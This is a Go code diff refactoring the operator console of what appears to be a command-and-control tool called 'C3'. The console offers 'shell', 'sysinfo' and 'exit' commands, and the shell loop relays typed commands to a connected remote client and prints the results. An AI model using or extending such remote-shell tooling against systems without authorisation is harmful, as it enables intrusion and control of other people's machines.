@@ -20,20 +20,20 @@ func shell(conn net.Conn) {
 
 	shellLoop:for {
 		fmt.Printf(color.Green + "[shell]: " + color.Reset)
-		cmd, _ := bufio.NewReader(os.Stdin).ReadString('\n')
-		cmd = strings.TrimSuffix(cmd, "\n")
+		shellCmd, _ := bufio.NewReader(os.Stdin).ReadString('\n')
+		shellCmd = strings.TrimSuffix(shellCmd, "\n")
 
 		switch {
-		case cmd == "\r":
+		case shellCmd == "":
 			continue
-		case cmd == "close":
-			enc.Encode(cmd)
+		case shellCmd == "close":
+			enc.Encode(shellCmd)
 			break shellLoop
 		default:
 			result := ""
-			enc.Encode(cmd)
+			enc.Encode(shellCmd)
 			dec.Decode(&result)
-			result = strings.TrimSuffix(cmd, "\n")
+			result = strings.TrimSuffix(result, "\n")
 			fmt.Println(string(result))
 		}
 	}
@@ -70,18 +70,18 @@ func exit(conn net.Conn) {
 func handleConnection(conn net.Conn) {
 	connLoop:for {
 		fmt.Printf(color.Blue + "[C3]: " + color.Reset)
-		reader, _ := bufio.NewReader(os.Stdin).ReadString('\n')
-		reader = strings.TrimSuffix(reader, "\n")
+		c3cmd, _ := bufio.NewReader(os.Stdin).ReadString('\n')
+		c3cmd = strings.TrimSuffix(c3cmd, "\n")
 
 		switch {
-		case reader == "\r":
-			continue
-		case reader == "exit":
+		case c3cmd == "":
+			continue connLoop
+		case c3cmd == "exit":
 			exit(conn)
 			break connLoop
-		case reader == "shell":
+		case c3cmd == "shell":
 			shell(conn)
-		case reader == "sysinfo":
+		case c3cmd == "sysinfo":
 			sysinfo(conn)
 		default:
 			fmt.Println(color.Red + "[ERROR]: " + color.Reset + "Invalid command")
